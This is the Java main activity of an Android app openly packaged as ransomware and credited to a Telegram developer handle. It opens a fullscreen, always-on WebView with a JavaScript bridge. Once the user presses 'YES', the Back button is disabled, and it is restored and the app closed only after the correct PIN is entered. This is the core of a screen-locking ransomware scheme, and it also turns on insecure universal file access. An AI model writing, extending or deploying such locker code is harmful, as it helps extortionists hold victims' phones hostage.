package com.rivan.ransomware;

// made by https://t.me/halilintardev

import android.annotation.SuppressLint;
import android.app.Activity;
import android.os.Bundle;
import android.view.WindowManager;
import android.webkit.JavascriptInterface;
import android.webkit.WebChromeClient;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private WebView webView;
    private boolean backLocked = false;   // dikendalikan oleh JS

    @SuppressLint({"SetJavaScriptEnabled", "AddJavascriptInterface"})
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Layar penuh, jaga layar tetap menyala
        getWindow().setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        );
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings ws = webView.getSettings();
        ws.setJavaScriptEnabled(true);
        ws.setDomStorageEnabled(true);
        ws.setCacheMode(WebSettings.LOAD_NO_CACHE);
        ws.setAllowFileAccessFromFileURLs(true);
        ws.setAllowUniversalAccessFromFileURLs(true);

        webView.setWebViewClient(new WebViewClient());
        webView.setWebChromeClient(new WebChromeClient());

        // Daftarkan bridge JS ↔ Java
        webView.addJavascriptInterface(new AndroidBridge(), "Android");

        // Muat HTML dari assets
        webView.loadUrl("file:///android_asset/index.html");
    }

    // ── BRIDGE JS ↔ JAVA ─────────────────────────────────────
    private class AndroidBridge {

        /** Dipanggil JS setelah YES ditekan → kunci tombol Back */
        @JavascriptInterface
        public void lockBack() {
            backLocked = true;
        }

        /** Dipanggil JS setelah PIN benar → buka kunci Back */
        @JavascriptInterface
        public void unlockBack() {
            backLocked = false;
        }

        /** Dipanggil JS setelah PIN benar → tutup Activity */
        @JavascriptInterface
        public void exitApp() {
            runOnUiThread(() -> {
                webView.destroy();
                finish();
            });
        }
    }

    // ── BLOCK TOMBOL BACK ANDROID ─────────────────────────────
    @Override
    public void onBackPressed() {
        if (backLocked) {
            // Jangan lakukan apa pun → tombol Back diabaikan total
            return;
        }
        super.onBackPressed();
    }

    // ── LIFECYCLE ─────────────────────────────────────────────
    @Override
    protected void onPause() {
        super.onPause();
        webView.onPause();
    }

    @Override
    protected void onResume() {
        super.onResume();
        webView.onResume();
    }

    @Override
    protected void onDestroy() {
        webView.destroy();
        super.onDestroy();
    }
}
